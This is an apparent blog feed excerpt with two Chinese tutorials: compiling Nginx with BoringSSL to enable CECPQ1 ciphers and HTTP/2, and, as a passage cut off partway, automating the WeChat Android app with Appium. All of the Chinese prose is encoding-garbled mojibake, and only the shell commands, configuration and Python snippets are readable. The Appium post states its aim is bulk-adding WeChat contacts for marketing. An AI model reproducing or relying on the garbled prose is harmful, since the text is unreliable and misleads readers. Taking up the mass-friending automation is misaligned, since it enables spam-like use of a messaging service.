<p>ÂØπ‰∫é Ubuntu 14.04 Âèä‰ª•ÂêéÁöÑÁî®Êà∑ÔºåÁî±‰∫é Ubuntu ÈááÁî®‰∫Ü Systemd ÊõøÊç¢‰∫Ü upstartÔºåÊïÖ BoringNginx ËÑöÊú¨‰ºöÂá∫ÈóÆÈ¢ò„ÄÇÂêåÊó∂ BoringNginx Ë¶ÅÊ±ÇËÑöÊú¨ÂøÖÈ°ªÂú®Èùû root Áî®Êà∑‰∏ãÊâßË°åÔºåËøôÂØπ‰∫éÂ§ßÈÉ®ÂàÜ‰π†ÊÉØÁî® root Áî®Êà∑Êù•ÈÖçÁΩÆÊúçÂä°Âô®ÁöÑÁî®Êà∑Êù•ËØ¥ÂçÅÂàÜ‰∏ç‰æøÔºåÊïÖÈúÄÈááÁî®ÊâãÂä®ÁºñËØë„ÄÅÂÆâË£Ö„ÄÇ</p>
<hr />
<h2>ÁºñËØë BoringSSL &amp; Nginx</h2>
<p><em>Ê≥®ÔºöËØ•ÈÉ®ÂàÜÊïôÁ®ãÂèÇËÄÉ‰∫Ü¬†Jerry Qu „Ää<a href="https://imququ.com/post/optimize-ssl-ciphers-with-boringssl.html" target="_blank" rel="noopener noreferrer">‰ΩøÁî® BoringSSL ‰ºòÂåñ HTTPS Âä†ÂØÜÁÆóÊ≥ïÈÄâÊã©</a>„Äã‰∏ÄÊñáÔºåÂú®Ê≠§Ë°®Á§∫ÊÑüË∞¢„ÄÇ</em></p>
<p>È¶ñÂÖàÂª∫Á´ã‰∏Ä‰∏™Êñá‰ª∂Â§πÔºåÂπ∂‰∏ãËΩΩ Nginx Âíå BoringSSL Ê∫êÁ†Å„ÄÇ</p>
<p>Nginx ‰ªé 1.7.4 ÂºÄÂßãÊîØÊåÅ BoringSSLÔºåËøôÈáåÊàë‰ΩøÁî®ÁöÑÊòØÊúÄÊñ∞ÁöÑÁ®≥ÂÆöÁâà NginxÔºö</p>
<pre class="brush: bash; title: ; notranslate">
mkdir nginx &amp;&amp; cd nginx
wget http://nginx.org/download/nginx-1.10.1.tar.gz
tar xzf nginx-1.10.1.tar.gz

git clone https://boringssl.googlesource.com/boringssl
</pre>
<p>Áé∞Âú®‰Ω†ÁöÑ nginx Êñá‰ª∂Â§πÈáåÂ∫îËØ•‰ºöÊúâËøô‰∏§‰∏™Â≠êÁõÆÂΩïÔºö</p>
<pre class="brush: bash; title: ; notranslate">
boringssl/
nginx-1.10.1/
</pre>
<p>Êé•‰∏ãÊù•ËøòÈúÄË¶ÅÂÅö‰∏Ä‰∫õÂáÜÂ§áÂ∑•‰ΩúÔºö</p>
<pre class="brush: bash; title: ; notranslate">
# ÂÆâË£ÖÁºñËØë BoringSSL ÊâÄÈúÄÁöÑ Golang Âíå cmake
sudo apt-get install golang cmake

# ÂÆâË£ÖÁºñËØë Nginx ÊâÄÈúÄÁöÑÂ∑•ÂÖ∑Âíå‰æùËµñÂ∫ì
sudo apt-get install build-essential libpcre3 libpcre3-dev zlib1g-dev

# ÂøΩÁï•ÁºñËØëËøáÁ®ã‰∏≠ÁöÑ WarningÔºà‰∏çÂä†Ëøô‰∏™ÔºåÁºñÂà∞‰∏ÄÂçä‰ºöÂõ†‰∏∫ Warning Â§™Â§öÊó†Ê≥ïÁªßÁª≠Ôºâ
export CFLAGS=&quot;-Wno-error&quot;
</pre>
<p>ÈöèÂêéÁºñËØë BoringSSLÔºö</p>
<pre class="brush: bash; title: ; notranslate">
# ËøõÂÖ• BoringSSL Ê∫êÁ†ÅÊ†πÁõÆÂΩï
cd boringssl

# ÂàõÂª∫ build ÁõÆÂΩïÂπ∂ÁºñËØëÔºåÂÆåÊàêÂêéÂõûÂà∞ BoringSSL Ê∫êÁ†ÅÊ†πÁõÆÂΩï
mkdir build &amp;&amp; cd build &amp;&amp; cmake ../ &amp;&amp; make &amp;&amp; cd ../

# ÂàõÂª∫ .openssl ÁõÆÂΩïÔºåÂπ∂Â∞ÜÂ∫ìÊñá‰ª∂ÂíåÁºñËØëÂêéÁöÑÊñá‰ª∂ÊîæËøõÂéª
mkdir -p .openssl/lib &amp;&amp; cd .openssl &amp;&amp; ln -s ../include . &amp;&amp; cd ../
cp build/crypto/libcrypto.a build/ssl/libssl.a .openssl/lib

cd ../
</pre>
<p>ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Áî® BoringSSL Êù•ÁºñËØë Nginx ‰∫ÜÔºö</p>
<pre class="brush: bash; title: ; notranslate">
# ËøõÂÖ• Nginx Ê∫êÁ†ÅÊ†πÁõÆÂΩï
cd nginx-1.10.1

# ÊåáÂÆö‰ΩøÁî® BoringSSL ‰Ωú‰∏∫ SSL Â∫ì
# ËøôÈáåÁöÑÂèÇÊï∞ÊØîÂéüÊñáË¶ÅÂ§ö‰∫ÜËÆ∏Â§öÔºåÊòØ‰∏∫‰∫ÜÂÖºÂÆπÈááÁî® apt ÂÆâË£ÖÁöÑ Nginx ÁöÑÈÖçÁΩÆ
./configure --with-openssl=../boringssl \
--prefix=/usr/share/nginx \
--sbin-path=/usr/sbin/nginx \
--conf-path=/etc/nginx/nginx.conf \
--error-log-path=/var/log/nginx/error.log \
--http-log-path=/var/log/nginx/access.log \
--pid-path=/run/nginx.pid \
--lock-path=/run/lock/subsys/nginx \
--user=www-data \
--group=www-data \
--with-threads \
--with-file-aio \
--with-ipv6 \
--with-http_ssl_module \
--with-http_v2_module \
--with-http_realip_module \
--with-http_gunzip_module \
--with-http_gzip_static_module \
--with-http_slice_module \
--with-http_stub_status_module \
--without-select_module \
--without-poll_module \
--without-mail_pop3_module \
--without-mail_imap_module \
--without-mail_smtp_module

# ‰øÆÊîπÊó∂Èó¥ÔºåÈÅøÂÖç Nginx ÂÜçÊ¨°ÁºñËØë BoringSSL
touch ../boringssl/.openssl/include/openssl/ssl.h
</pre>
<p>ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ÂºÄÂßãÁºñËØë Nginx ‰∫ÜÔºå Áõ¥Êé•ÊâßË°åÔºö</p>
<pre class="brush: bash; title: ; notranslate">
make
</pre>
<p>‰∏ÄÂàáÊ≠£Â∏∏ÁöÑËØùÔºåÂç≥ÂèØÂú® objs ÁõÆÂΩïÈáåÊâæÂà∞ÁºñËØëÂ•ΩÁöÑ Nginx„ÄÇ<br />
ÊâßË°åÔºö</p>
<pre class="brush: bash; title: ; notranslate">
cd objs
./nginx -V
</pre>
<p>Â∫îËØ•ÂèØ‰ª•ÁúãÂà∞Á±ª‰ººËøôÊ†∑ÁöÑËæìÂá∫Ôºö</p>
<pre class="brush: bash; title: ; notranslate">
nginx version: nginx/1.10.1
built with OpenSSL 1.0.2 (compatible; BoringSSL) (running with BoringSSL)
TLS SNI support enabled
configure arguments: --with-openssl=../boringssl --prefix=/usr/share/nginx --sbin-path=/usr/sbin/nginx --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/run/nginx.pid --lock-path=/run/lock/subsys/nginx --user=www-data --group=www-data --with-threads --with-file-aio --with-ipv6 --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_slice_module --with-http_stub_status_module --without-select_module --without-poll_module --without-mail_pop3_module --without-mail_imap_module --without-mail_smtp_module
</pre>
<p>Ë°®ÊòéÁºñËØëÊàêÂäü‰∫Ü„ÄÇ‰∏ãÈù¢Êàë‰ª¨Ë¶ÅÂ∞ÜËØ• Nginx ÂÆâË£ÖËá≥Á≥ªÁªü‰∏≠„ÄÇ</p>
<hr />
<h2>ÂÆâË£Ö Nginx with BoringSSL</h2>
<p>Áî±‰∫éÈÖçÁΩÆÊúçÂä°ÈúÄË¶Å‰∏Ä‰∫õÈ¢ùÂ§ñÁöÑÁü•ËØÜÔºåÂõ†Ê≠§‰∏∫‰∫ÜÁÆÄÂçïËµ∑ËßÅÔºåÊàëÈááÁî®‰∫Ü <em>‰ΩøÁî® apt ÂÆâË£ÖÂéüÁâà Nginx ÁÑ∂ÂêéÊõøÊç¢ÂèØÊâßË°åÊñá‰ª∂</em> ÁöÑÊñπÂºèÊù•ÁÆÄÂåñÂÆâË£ÖÂíåÊúçÂä°ÁöÑÈÖçÁΩÆ„ÄÇËøô‰πüÊòØ‰∏∫‰ªÄ‰πàÂú®‰∏äÊñá‰∏≠ÊàëÂª∫ËÆÆ‰ΩøÁî®Âíå apt ÂÆâË£ÖÁöÑ Nginx Áõ∏‰ªøÁöÑÈÖçÁΩÆÊù•ÁºñËØëËá™Â∑±ÁöÑ Nginx„ÄÇ</p>
<p>È¶ñÂÖàÁî® apt Êù•ÂÆâË£ÖÂéüÁâà NginxÔºö</p>
<pre class="brush: bash; title: ; notranslate">
# ‰ªé Ubuntu 16.04 ÂºÄÂßãÁ≥ªÁªüËá™Â∏¶Ê∫êÁöÑ nginx Â∞±ÊòØ1.10 ÁâàÊú¨ÁöÑ
apt-get install nginx
</pre>
<p>ÊàñËÄÖ</p>
<pre class="brush: bash; title: ; notranslate">
# ÂÖàÊ∑ªÂä† Nginx ÂÆòÊñπËΩØ‰ª∂Ê∫ê
add-apt-repository ppa:nginx/stable
apt-get update
apt-get install nginx
</pre>
<p>ÁÑ∂ÂêéÊõøÊç¢ÂéüÁâà Nginx ‰∏∫Êàë‰ª¨Ëá™Â∑±ÁºñËØëÁöÑÁâàÊú¨Ôºö</p>
<pre class="brush: bash; title: ; notranslate">
# ÂÖàÂÅúÊ≠¢ Nginx ÊúçÂä°
service nginx stop

# Â§á‰ªΩÂéüÁâàÂèØÊâßË°åÊñá‰ª∂
cp /usr/sbin/nginx  ./nginx.bak

# ÊõøÊç¢ Nginx ÂèØÊâßË°åÊñá‰ª∂
cp nginx /usr/sbin/nginx

# Âà†Èô§ Nginx ÈªòËÆ§ÁöÑ modulesÔºå Âê¶ÂàôÂèØËÉΩÂêØÂä®Êó∂Êä•‰∫åËøõÂà∂‰∏çÂÖºÂÆπÁöÑÈîôËØØ
rm /etc/nginx/modules-enabled/*
</pre>
<p>ËøôÊ†∑‰∏ÄÊù•ÔºåÂ∞±ÊàêÂäüÁöÑÂ∞ÜÁ≥ªÁªü‰∏≠ÁöÑ Nginx ÊõøÊç¢‰∏∫Êàë‰ª¨Ëá™Â∑±ÁºñËØëÁöÑÁâàÊú¨ÔºåÂêåÊó∂Âèà‰øùÁïô‰∫ÜÂéüÁâàÁöÑÊúçÂä°ÊéßÂà∂ÊñπÂºèÔºåÈùûÂ∏∏Êñπ‰æø„ÄÇ</p>
<hr />
<h2>ÈÖçÁΩÆ Cipher Suite</h2>
<p>Âú®ËøôÈáåÂÅáÂÆö‰Ω†Â∑≤ÁªèÁü•ÈÅìÂ¶Ç‰ΩïÈÖçÁΩÆ¬†Nginx + SSL ‰∫ÜÔºåÂ¶ÇÊûú‰∏ç‰ºöÔºåËØ∑ÁôæÂ∫¶ÊàñËÄÖË∞∑Ê≠å‰∏Ä‰∏ã„ÄÇ</p>
<p>‰∏∫‰∫ÜÂêØÁî® CECPQ1 ÁÆóÊ≥ïÔºåÈúÄË¶ÅÈÖçÁΩÆÊ≠£Á°ÆÁöÑ Cipher SuitÔºö</p>
<pre class="brush: plain; title: ; notranslate">
ssl_ciphers &quot;[CECPQ1-ECDSA-AES256-GCM-SHA384|CECPQ1-ECDSA-CHACHA20-POLY1305-SHA256]:[CECPQ1-RSA-AES256-GCM-SHA384|CECPQ1-RSA-CHACHA20-POLY1305-SHA256]:[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305-SHA256]:[ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305-SHA256]:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:RSA-AES128-GCM-SHA256:RSA-AES256-GCM-SHA384:RSA-AES128-SHA:RSA-AES256-SHA:RSA-3DES-EDE-SHA&quot;;
ssl_prefer_server_ciphers on;
</pre>
<p>ÂÖ∂‰∏≠ÊúÄÂÖàÂá∫Áé∞ÁöÑÂá†‰∏™‰ª•‚ÄúCECPQ1‚ÄùÂºÄÂ§¥ÁöÑÁÆóÊ≥ïÂ∞±ÊòØÊú¨ÊñáÊèêÂà∞ÁöÑÁÆóÊ≥ï„ÄÇ<br />
ÂÖ≥‰∫éËØ• Cipher Suite ÁöÑÊ†ºÂºèÂíåÊÑèÊÄùÔºå‰πüËØ∑ÂèÇËÄÉ„Ää<a href="https://imququ.com/post/optimize-ssl-ciphers-with-boringssl.html" target="_blank" rel="noopener noreferrer">‰ΩøÁî® BoringSSL ‰ºòÂåñ HTTPS Âä†ÂØÜÁÆóÊ≥ïÈÄâÊã©</a>„Äã‰∏ÄÊñá„ÄÇ</p>
<p>ÂêåÊó∂Êàë‰ª¨ÁºñËØëÂá∫ÁöÑ Nginx ÊòØÊîØÊåÅ HTTP/2 ‰ª•Âèä ALPN ÁöÑÔºåÂú®‰Ω†ÁöÑÈÖçÁΩÆÈáåÂÜô‰∏äÔºö</p>
<pre class="brush: plain; title: ; notranslate">
listen 443 ssl http2;
</pre>
<p>Âç≥ÂèØÂêØÁî®ÊúÄÊñ∞ÊúÄÁÇ´ÈÖ∑ÁöÑ h2 Âï¶ÔºÅ<br />
ÔºàÂΩìÁÑ∂Ë∞∑Ê≠åÂèàÂºÑ‰∫Ü‰∏™ QUIC ÂçèËÆÆÔºåÁõÆÂâç‰∏çÂ§™ÂÆπÊòìÂú® Nginx ‰∏äÂÆûÁé∞ÔºåÊÆãÂøµ„ÄÇÔºâ</p>
<hr />
<h2>¬†ÁªìÊùü</h2>
<p>ËøôÁØáÊïôÁ®ãÂà∞ËøôÈáåÂ∞±ÁªìÊùüÂï¶~Â¶ÇÊûúÂêÑ‰ΩçËØªËÄÖËÄÅÁà∑ÂèëÁé∞Êúâ‰ªÄ‰πàÈîôËØØÊàñ‰∏çÂΩì‰πãÂ§ÑÔºåËøòËØ∑ÂõûÂ§çÊåáÊ≠£~</p>
<p>‰πüÊ¨¢ËøéÂêÑ‰ΩçÂÖ±ÂêåÊé¢ËÆ®Áõ∏ÂÖ≥ÊäÄÊúØ~</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/cecpq1-nginx-boringssl.html">Use CECPQ1 On Your Website with Nginx &#038; BoringSSL</a>ÔºåÈ¶ñÂèë‰∫é<a rel="nofollow" href="https://www.noisyfox.io">ÁãêÁã∏ÁöÑÂ∞èÂ∞èÁ™ù</a>„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[ÁãêÁã∏ÁöÑÂ∞èÂ∞èÁ™ù]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2016/08/appium-android-ui-test/</id>
        <title><![CDATA[AppiumÂú®Android UIÊµãËØï‰∏≠ÁöÑÂ∫îÁî®]]></title>
        <updated>2016-08-18T15:29:08+08:00</updated>
        <link href="https://www.summershrimp.com/2016/08/appium-android-ui-test/"/>
        <content type="text/html" src="https://www.summershrimp.com/2016/08/appium-android-ui-test/"><![CDATA[<h2>AndroidÊµãËØïÂ∑•ÂÖ∑‰∏éAppiumÁÆÄ‰ªã</h2>
<p>AppiumÊòØ‰∏Ä‰∏™C/SÊû∂ÊûÑÁöÑÔºåÊîØÊåÅAndroid/iOS Native, Hybrid Âíå Mobile Web AppsÁöÑÊµãËØïÊ°ÜÊû∂Ôºå‰∏éÊµãËØïÁ®ãÂ∫èÈÄöËøáSelenum WebdriverÂçèËÆÆÈÄöËÆØ„ÄÇWebdriverÁöÑÂ•ΩÂ§ÑÊòØÈÄöËøáHTTP RPCÁöÑÊñπÂºèË∞ÉÁî®Server‰∏äÁöÑËøáÁ®ãÔºåÁºñÂÜôÊµãËØïËÑöÊú¨‰∏çÂèóËØ≠Ë®ÄÁöÑÈôêÂà∂ÔºåÊó†ËÆ∫ÊòØPython, Java, NodeJSÂùáÂèØ‰ª•Êñπ‰æøÁöÑÁºñÂÜôÊµãËØï„ÄÇÊú¨Êñá‰∏≠Â∞Ü‰ΩøÁî®PythonËøõË°åÁºñÁ®ã„ÄÇ</p>
<p>Ëµ∑Âõ†ÊòØÂõ†‰∏∫Â∏ÇÂú∫ÈÉ®ÁöÑÂêå‰∫ãÊäõÊù•Â¶Ç‰∏ãÈúÄÊ±ÇÔºöÊâπÈáèÊ∑ªÂä†‰∏Ä‰∫õÂæÆ‰ø°Â•ΩÂèã„ÄÇÁõ¥Êé•ÊäìÂèñËØ∑Ê±ÇËøõË°åÈáçÊîæÁöÑÊñπÊ≥ïÊòØ‰∏çÈù†Ë∞±ÁöÑÔºåÂæÆ‰ø°‰∏éÊúçÂä°Á´ØÁöÑÈÄöËÆØÂùáÂä†ÂØÜÔºåPass„ÄÇËÄÉËôë‰ΩøÁî®xposedÁ≠âÊ°ÜÊû∂hookÁõ∏ÂÖ≥ÂáΩÊï∞ËøõË°åÊìç‰Ωú„ÄÇ‰ΩÜÊòØxposedÈúÄË¶ÅË∂äÁã±Ôºå‰∏îÂºÄÂèëÂ§çÊùÇÔºåPass„ÄÇÂêéÊù•ÊÉ≥Âà∞‰∫Ü‰ΩøÁî®UIÊµãËØïÂ∑•ÂÖ∑ËøõË°åÊ®°ÊãüÊìç‰ΩúÔºåÂºÄÂèëËæÉ‰∏∫ÁÆÄÂçï„ÄÇ</p>
<p>Android UIÊµãËØïÂ∑•ÂÖ∑ÊúâÂæàÂ§öÁßçÔºåÂ¶ÇMonkey, UIAutomator, Selendroid,¬†RobotiumÁ≠â„ÄÇÂÖ∂‰∏≠UIAutomator,¬†Monkey,¬†SelendroidÂùá‰∏∫Èùû‰æµÂÖ•ÂºèÁöÑUIÊµãËØïÔºå‰πüÂ∞±ÊòØ‰∏çÈúÄË¶Å‰øÆÊîπÊ∫ê‰ª£Á†ÅÔºåÂè™Ë¶ÅÂÆâË£Ö‰∫ÜÁõÆÊ†áÁ®ãÂ∫èÂ∞±ÂèØ‰ª•ËøõË°åÊµãËØï„ÄÇRobotiumÈúÄË¶Å‰∏éÊ∫êÁ†Å‰∏ÄÂêåÁºñËØëÊµãËØï„ÄÇAppiumÂÆûÈôÖ‰∏äÂ∞±ÊòØ‰∏Ä‰∏™ÊµãËØïÂ∑•ÂÖ∑ÁöÑÁªü‰∏ÄË∞ÉÂ∫¶ËΩØ‰ª∂ÔºåÂ∞Ü‰∏çÂêåÁöÑÈùû‰æµÂÖ•ÂºèÊµãËØïÂ∑•ÂÖ∑Êï¥ÂêàÂú®‰∏ÄËµ∑ÔºåÂØπÂ§ñÊèê‰æõÁªü‰∏ÄÁöÑAPI„ÄÇÂú®Android 2.3‰ª•ÂâçÁöÑÁâàÊú¨ÔºåAppium‰ºöË∞ÉÁî®SelendroidÔºå‰πãÂêéÁöÑÁâàÊú¨‰ºöÁõ¥Êé•‰ΩøÁî®UIAutomatorÔºåiOS‰∏ã‰ΩøÁî®UIAutomation„ÄÇAppiumËøòÊîØÊåÅFirefoxOSÁöÑUIÊµãËØï„ÄÇ</p>
<figure style="width: 347px" class="wp-caption alignnone"><img class="" src="https://dn-summershrimp-my-blog.qbox.me/appium.gif" width="347" height="614" /><figcaption class="wp-caption-text">Appium Gif</figcaption></figure>
<h2>ÂÆâË£ÖAppium</h2>
<p>ÂÆòÁΩëÁªôÂá∫‰∫ÜÂëΩ‰ª§Ë°å‰∏ãÁöÑÂÆâË£ÖÊñπÊ≥ï„ÄÇ‰ΩÜÂÆûÈôÖ‰∏äAppiumÊúâGUIÁâàÊú¨ÔºåÊõ¥ÈÄÇÂêàÂú®Windows/MacOS‰∏ã‰ΩøÁî®„ÄÇWindows‰∏ãÈúÄË¶ÅÂÆâË£Ö.NET Framework„ÄÇ</p>
<pre class="lang:default decode:true">&gt; brew install node      # get node.js
&gt; npm install -g appium  # get appium
&gt; npm install wd         # get appium client
&gt; appium &amp;               # start appium
&gt; node your-appium-test.js</pre>
<p>AppiumÈúÄË¶Å‰æùËµñAndroid SDKÁºñËØëÂú®ÊâãÊú∫Á´ØËøêË°åÁöÑ‰∏§‰∏™Êèí‰ª∂ÔºåÂõ†Ê≠§ÈúÄË¶ÅÈ¶ñÂÖàÂÆâË£ÖÁõ∏Â∫îÁöÑAndroid SDKÁâàÊú¨„ÄÇËøôÈáåÁõ¥Êé•‰ΩøÁî®‰∫ÜAndroid Studio‰∏≠Ëá™Â∏¶ÁöÑSDK Manager„ÄÇÂú®SDKManager‰∏≠ÈÄâÊã©ÂíåÊµãËØïÊú∫Áõ∏ÂØπÂ∫îÁöÑSDK PlatformÂíåËæÉÊñ∞ÁöÑBuild-toolsÔºåÂ¶ÇÊûúÈúÄË¶Å‰ΩøÁî®Ê®°ÊãüÂô®ÊµãËØïËøòË¶ÅË£ÖÂØπÂ∫îÁöÑARM/x86 System ImageÔºå‰ª•ÂèäIntel HAXM InstallerÔºåÁî®‰∫éÂä†ÈÄüx86ËôöÊãüÊú∫„ÄÇAppium‰ΩøÁî®adbÊù•‰∏éÁõÆÊ†áÊú∫Âô®ÈÄöËÆØÔºåÂõ†Ê≠§ÂØπ‰∫éÁúüÊú∫ÂíåÊ®°ÊãüÂô®Êìç‰ΩúÂá†‰πéÈÉΩÊòØÁõ∏ÂêåÁöÑÔºåÂ¶Ç‰ΩïÂª∫Á´ãÊ®°ÊãüÂô®Âú®Ê≠§‰∏çÂÜçËµòËø∞„ÄÇ</p>
<p>ÂÆâË£ÖÂÆåÊàêÂêéÈúÄË¶ÅÂú®Appium GUI‰∏≠ÈÖçÁΩÆAndroid SDKÁõÆÂΩïÔºåÈöèÂêéÈÄâÊã©AndroidÔºåÁÇπÂáªLaunchÂ∞±ÂèØ‰ª•ÂêØÂä®Appium Server„ÄÇ</p>
<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk.png"><img class="alignnone size-medium wp-image-102" src="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-280x300.png" alt="Appium-android-sdk" width="280" height="300" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-280x300.png 280w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-768x823.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-956x1024.png 956w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk.png 1333w" sizes="(max-width: 280px) 100vw, 280px" /></a><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch.png"><img class="alignnone size-medium wp-image-103" src="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-300x263.png" alt="Appium-launch" width="300" height="263" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-300x263.png 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-768x672.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-1024x896.png 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch.png 1332w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>Appium ServerÈªòËÆ§‰ºöÁõëÂê¨http://localhost:4723 ÔºåÁî®‰∫éRPCÈÄöËÆØ„ÄÇ‰∏ãÈù¢Êàë‰ª¨Â∞±ÂèØ‰ª•ÊâìÂºÄÁÜüÊÇâÁöÑÁºñÁ®ãÁéØÂ¢ÉÔºåÁºñÂÜôUIÊµãËØïÁî®‰æã‰∫Ü„ÄÇËøôÈáå‰ΩøÁî®PythonËøõË°åÁºñÂÜôÔºåÈúÄË¶ÅÂÖàÂÆâË£ÖAppiumÁöÑPython Client ¬†ÔºåÁÑ∂ÂêéÂÜçpython‰∏≠‰ΩøÁî®appium.webclientÂ∞±ÂèØ‰ª•ËøûÊé•Appium server‰∫Ü„ÄÇ</p>
<pre class="lang:default decode:true">pip install Appium-Python-Client</pre>
<h2>‰ΩøÁî®AppiumËøõË°åUIÊéßÂà∂</h2>
<p>Ê†πÊçÆÊ≥®Èáä‰øÆÊîπÁõ∏Â∫îÂ±ûÊÄßÂêéÂç≥ÂèØËøêË°åÊµãËØï„ÄÇÊâãÊú∫ÈúÄË¶ÅÊâìÂºÄADBË∞ÉËØïÔºåÊâßË°åÂÆå‰ª•‰∏ã‰ª£Á†ÅÂêéÔºåAppium‰ºöÂú®ÊâãÊú∫‰∏äÂÆâË£ÖAppium SettingsÂíåUnlock‰∏§‰∏™Á®ãÂ∫èÔºåÈöèÂêéÂæÆ‰ø°‰ºöË¢´ÂêØÂä®„ÄÇ</p>
<pre class="lang:python decode:true">from appium import webdriver

desired_caps = {}
desired_caps['platformName'] = 'Android'  #ÊµãËØïÂπ≥Âè∞
desired_caps['platformVersion'] = '5.1'   #Âπ≥Âè∞ÁâàÊú¨
desired_caps['deviceName'] = 'm3_note'    #ËÆæÂ§áÂêçÁß∞ÔºåÂ§öËÆæÂ§áÊó∂ÈúÄÂå∫ÂàÜ
desired_caps['appPackage'] = 'com.tencent.mm'  #app packageÂêç
desired_caps['appActivity'] = '.ui.LauncherUI' #appÈªòËÆ§Activity
dr = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) #ÂêØÂä®Remote RPC
</pre>
<p>Selenum Webdriver‰ΩøÁî®‰∫Ü‰∏ÄÁßçÁ±ª‰ºº‰∫éJS‰∏≠ÁöÑDOMÊ®°ÂûãÁöÑÊñπÊ≥ïÊù•ÈÄâÊã©È°µÈù¢‰∏≠ÁöÑÂÖÉÁ¥†„ÄÇdr‰∏∫ÂΩìÂâçÊ≠£Âú®Ê¥ªÂä®ÁöÑactivityÂØπË±°ÔºåÂèØ‰ª•‰ΩøÁî®findElementByXXXÁöÑÊñπÊ≥ïÊù•Ëé∑ÂèñActivity‰∏≠ÁöÑÂÖÉÁ¥†„ÄÇÊâÄÊúâElementÂêéÂ∏¶sÁöÑÂáΩÊï∞ÔºåÂùáËé∑ÂæóÊâÄÊúâÂåπÈÖçÁöÑÂÖÉÁ¥†Ôºå‰∏çÂ∏¶sÁöÑÂáΩÊï∞Ëé∑ÂæóÁ¨¨‰∏Ä‰∏™ÂåπÈÖçÁöÑÂÖÉÁ¥†„ÄÇ</p>
<h3>Êü•ËØ¢ÂáΩÊï∞</h3>
<h4>1. findElement(s)ByName</h4>
<p>Âú®Android‰∏≠Âü∫Êú¨Ê≤°Áî®„ÄÇAndroid UIÊ≤°ÊúâNameËøô‰∏™Â±ûÊÄß„ÄÇÊúâËØ¥ÂèØ‰ª•‰ΩøÁî®textÂÄºËé∑Âèñ„ÄÇ‰ΩÜÊàëÂπ∂Ê≤°ÊúâÊàêÂäü</p>
<h4>2. findElement(s)ByClassName</h4>
<p>ÈÄöËøáÁ±ªÂêçÊù•Ëé∑ÂèñÂÖÉÁ¥†ÔºåÁî®Ê≥ïÂ¶Ç‰∏ãÔºö</p>
<pre class="lang:python decode:true ">item_list = dr.find_elements_by_class_name("android.widget.LinearLayout")
item_list[2].click()</pre>
<h4>3. findElementById</h4>
<p>ÈÄöËøáresource_idÊù•Ëé∑ÂèñÂÖÉÁ¥†ÔºåÊØè‰∏™Activity‰∏≠ÈÉΩÊòØÂîØ‰∏ÄÁöÑÔºåÁî®Ê≥ïÂ¶Ç‰∏ã</p>
<pre class="lang:python decode:true">t = dr.find_element_by_id("com.tencent.mm:id/f7")
t.send_keys(wechatId)</pre>
<h4>4. findElement(s)ByAccessbiltiyId</h4>
<p>Âú®Android‰∏äAccessbilityIDÂÆûÈôÖÂ∞±ÊòØcontentDescription„ÄÇËøô‰∏™Â±ûÊÄßÊòØ‰∏∫‰∫ÜÊñπ‰æøËßÜÂäõÂèóÊçü‰∫∫Â£´‰ΩøÁî®ÊâãÊú∫ÊâÄËÆæÁΩÆ„ÄÇÂºÄÂêØTTSÂêéÁ≥ªÁªü‰ºöÊúóËØªÁõ∏ÂÖ≥Êéß‰ª∂ÁöÑcontentDescription„ÄÇ</p>
<h4>5. findElement(s)ByXPath</h4>
<p>ÈÄöËøáXML PathÊèèËø∞Êù•ÂØªÊâæÂÖÉÁ¥†„ÄÇÊàëÊ≤°ÊúâÊàêÂäüÁöÑËé∑ÂèñÂà∞ÔºåÂèØËÉΩÊòØXPathÂÜôÁöÑÊúâÈóÆÈ¢ò„ÄÇ</p>
<pre class="lang:python decode:true">s = dr.find_element_by_xpath("//android.widget.TextView[contains(@text,'ÊêúÁ¥¢')]")
s.click()</pre>
<h4>6. findElementByAndroidUIAutomator</h4>
<p>ÈÄöËøáUIAutomatorÁöÑÈÄâÊã©Âô®Êù•Ëé∑ÂèñÂÖÉÁ¥†„ÄÇÂõ†‰∏∫AppiumÂú®Android‰∏äÂÆûÈôÖÊòØË∞ÉÁî®ÁöÑUIAutomatorÔºåÊâÄ‰ª•ÂèØ‰ª•ÈÄöËøáUIAutomatorÁöÑÈÄâÊã©Âô®Êù•ÈÄâÊã©ÂÖÉÁ¥†„ÄÇ</p>
<pre class="lang:python decode:true ">el = dr.find_element_by_android_ui_automator("new UiSelector().text(\"ÊêúÁ¥¢\")")
el.click()</pre>
<h3>Êìç‰ΩúÂáΩÊï∞</h3>
<p>Êìç‰ΩúÂáΩÊï∞Áî®‰∫éÊìç‰ΩúÈÄâÂÆöÁöÑÂÖÉÁ¥†ÔºåÊúâÂæàÂ§öÔºå‰ª•‰∏ã‰ªÖÂàó‰∏æÂá†‰∏™ÔºåÊõ¥Â§öÁöÑËØ∑Êü•ÈòÖÊâãÂÜå„ÄÇ</p>
<ol>
<li>click</li>
<li>send_keys</li>
<li>clear</li>
</ol>
